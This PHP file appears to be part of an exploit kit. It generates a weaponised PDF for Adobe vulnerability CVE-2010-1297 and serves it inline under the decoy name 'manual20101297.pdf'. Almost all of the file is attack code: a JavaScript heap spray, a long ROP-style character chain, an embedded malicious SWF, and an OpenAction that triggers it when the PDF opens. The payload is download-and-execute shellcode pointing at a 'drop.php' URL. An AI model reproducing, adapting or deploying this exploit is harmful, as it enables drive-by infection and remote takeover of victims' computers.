<?php


function generate_swf() {
	$swf = @file_get_contents( 'exploits/Adobe-2010-1297.swf' );
	return $swf;
}

function generate_js($url) {
	$js = '';
	$js = $js . 'var c = String.fromCharCode((3084), (3084));';
	$js = $js . 'blah = 128 * 8 * 8 * 8;';
	$js = $js . 'blah2 = 7 * 4;';
	$js = $js . 'while ((c.length + blah2) < blah) c+=c;';
	$js = $js . 'var chars = \'\';';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(16447);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(52428);';
	$js = $js . 'chars = chars + String.fromCharCode(52428);';
	$js = $js . 'chars = chars + String.fromCharCode(7866);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(16677);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(52428);';
	$js = $js . 'chars = chars + String.fromCharCode(52428);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8080);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(7866);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(29096);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8080);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(36924);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(46738);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8904);';
	$js = $js . 'chars = chars + String.fromCharCode(19077);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(4096);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(2);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(258);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(25509);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(11698);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(10929);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(43174);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8080);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(36920);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(46738);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(64);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(1);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(25509);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(11698);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(10929);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(43174);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(8080);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(36912);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(46738);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4196);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(34);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(0);';
	$js = $js . 'chars = chars + String.fromCharCode(1);';
	$js = $js . 'chars = chars + String.fromCharCode(25509);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4);';
	$js = $js . 'chars = chars + String.fromCharCode(19082);';
	$js = $js . 'chars = chars + String.fromCharCode(8598);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(36954);';
	$js = $js . 'chars = chars + String.fromCharCode(36948);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(60250);';
	$js = $js . 'chars = chars + String.fromCharCode(22549);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(6795);';
	$js = $js . 'chars = chars + String.fromCharCode(6281);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(49283);';
	$js = $js . 'chars = chars + String.fromCharCode(33540);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(1218);';
	$js = $js . 'chars = chars + String.fromCharCode(64385);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(3084);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(61045);';
	$js = $js . 'chars = chars + String.fromCharCode(1515);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(59112);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(37119);';
	$js = $js . 'chars = chars + String.fromCharCode(37008);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(37008);';
	$js = $js . 'chars = chars + String.fromCharCode(37008);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(37008);';
	$js = $js . 'chars = chars + String.fromCharCode(37008);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(46784);';
	$js = $js . 'chars = chars + String.fromCharCode(19073);';
	$js = $js . 'chars = chars + String.fromCharCode(34084);';
	$js = $js . 'chars = chars + String.fromCharCode(19076);';
	$js = $js . 'chars = chars + String.fromCharCode(65535);';
	$js = $js . 'chars = chars + String.fromCharCode(37119);';
	$js = $js . 'chars = chars + String.fromCharCode(1979);';
	$js = $js . 'chars = chars + String.fromCharCode(19074);';
	$js = $js . 'chars = chars + String.fromCharCode(8080);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(4);';
	$js = $js . 'chars = chars + String.fromCharCode(19082);';
	$js = $js . 'chars = chars + String.fromCharCode(42968);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'chars = chars + String.fromCharCode(25850);';
	$js = $js . 'chars = chars + String.fromCharCode(19072);';
	$js = $js . 'var code = chars + \'' . shellcode_dl_exec_js( $url ) . '\';';
	$js = $js . 'var v = c.substring(0, (0x0c0c-0x24)/2);';
	$js = $js . 'v += code;';
	$js = $js . 'v += c;';
	$js = $js . 'var d = v.substring(0, 65536/2);';
	$js = $js . 'while(1){';
	$js = $js . '	d += d;';
	$js = $js . '	if(d.length >= 0x80000) break;';
	$js = $js . '}';
	$js = $js . 'var t = d.substring(0, 0x80000 - (0x1020-0x08) / 2);';
	$js = $js . 'var f = new Array();';
	$js = $js . 'for (var i = 0; i < 0x1f0; i++){';
	$js = $js . '	f[i]=t+\'s\';';
	$js = $js . '}';
	return $js;
}

function generate_pdf($url) {
	$js = generate_js( $url );
	$js = pdf_FlateEncode( $js );
	$jslen = strlen( $js );
	$swf = pdf_FlateEncode( generate_swf(  ) );
	$swflen = strlen( $swf );
	$swfname = 'test.swf';
	$eol = '
';
	$endobj = 'endobj' . $eol;
	$xref = array(  );
	$pdf = '%PDF-1.5' . $eol;
	$pdf = $pdf . '%' . RandomNonASCIIString( 4 ) . $eol;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 1 ) . '<</Type/Catalog';
	$pdf = $pdf . '/Pages ' . ioRef( 3 );
	$pdf = $pdf . '/OpenAction ' . ioRef( 5 );
	$pdf = $pdf . '/AcroForm ' . ioRef( 17 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 3 ) . '<</Type/Pages/Count 1/Kids [' . ioRef( 4 ) . ']>>' . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 4 ) . '<</Type/Page/Parent ' . ioRef( 3 );
	$pdf = $pdf . '/Annots [' . ioRef( 7 ) . '] ';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 5 ) . '<</Type/Action/S/JavaScript/JS ' . ioRef( 6 ) . '>>' . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 6 ) . '<</Length ' . $jslen . '/Filter[/FlateDecode]>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $js . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 7 ) . '<</Type/Annot/Subtype/RichMedia';
	$pdf = $pdf . '/Rect [20 20 187 69] ';
	$pdf = $pdf . '/RichMediaSettings ' . ioRef( 8 );
	$pdf = $pdf . '/RichMediaContent ' . ioRef( 9 );
	$pdf = $pdf . '/NM (' . $swfname . ')';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 8 );
	$pdf = $pdf . '<</Type/RichMediaSettings/Subtype/Flash';
	$pdf = $pdf . '/Activation ' . ioRef( 10 );
	$pdf = $pdf . '/Deactivation ' . ioRef( 11 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 9 );
	$pdf = $pdf . '<</Type/RichMediaContent';
	$pdf = $pdf . '/Assets ' . ioRef( 12 );
	$pdf = $pdf . '/Configurations [' . ioRef( 14 ) . ']';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 10 );
	$pdf = $pdf . '<</Type/RichMediaActivation/Condition/PO>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 11 );
	$pdf = $pdf . '<</Type/RichMediaDeactivation/Condition/XD>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 12 );
	$pdf = $pdf . '<</Names [(' . $swfname . ') ' . ioRef( 13 ) . ']>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 13 );
	$pdf = $pdf . '<</Type/Filespec /EF <</F ' . ioRef( 16 ) . '>> /F(' . $swfname . ')>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 14 );
	$pdf = $pdf . '<</Type/RichMediaConfiguration/Subtype/Flash';
	$pdf = $pdf . '/Instances [' . ioRef( 15 ) . ']>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 15 );
	$pdf = $pdf . '<</Type/RichMediaInstance/Subtype/Flash';
	$pdf = $pdf . '/Asset ' . ioRef( 13 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 16 ) . '<</Type/EmbeddedFile/Length ' . $swflen . '/Filter[/FlateDecode]>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $swf . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 17 );
	$pdf = $pdf . '<</XFA ' . ioRef( 18 ) . '>>' . $eol;
	$pdf = $pdf . $endobj;
	$xfa = '<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>';
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 18 ) . '<</Length ' . strlen( $xfa ) . '>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $xfa . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xrefPosition = strlen( $pdf );
	$pdf = $pdf . 'xref' . $eol;
	$pdf = $pdf . '0 ' . ( count( $xref ) + 1 ) . $eol;
	$pdf = $pdf . '0000000000 65535 f' . $eol;
	$i = 0;

	while ($i < count( $xref )) {
		$temp = sprintf( '%010d 00000 n', $xref[$i] );
		$pdf = $pdf . $temp . $eol;
		++$i;
	}

	$pdf = $pdf . 'trailer' . $eol;
	$pdf = $pdf . '<</Size ' . ( count( $xref ) + 1 ) . '/Root ' . ioRef( 1 ) . '>>' . $eol;
	$pdf = $pdf . 'startxref' . $eol;
	$pdf = $pdf . $xrefPosition . $eol;
	$pdf = $pdf . '%%EOF' . $eol;
	return $pdf;
}

include( 'config.php' );
include( 'include/util.php' );
include( 'include/shellcode.php' );
$pdf = generate_pdf( $config_url . '/drop.php?e=Adobe-2010-1297' );
header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
header( 'Cache-Control: no-cache' );
header( 'Pragma: no-cache' );
header( 'Accept-Ranges: bytes
' );
header( 'Content-Length: ' . strlen( $pdf ) . '
' );
header( 'Content-Disposition: inline; filename=manual20101297.pdf' );
header( '
' );
header( 'Content-Type: application/pdf

' );
echo $pdf;
?>
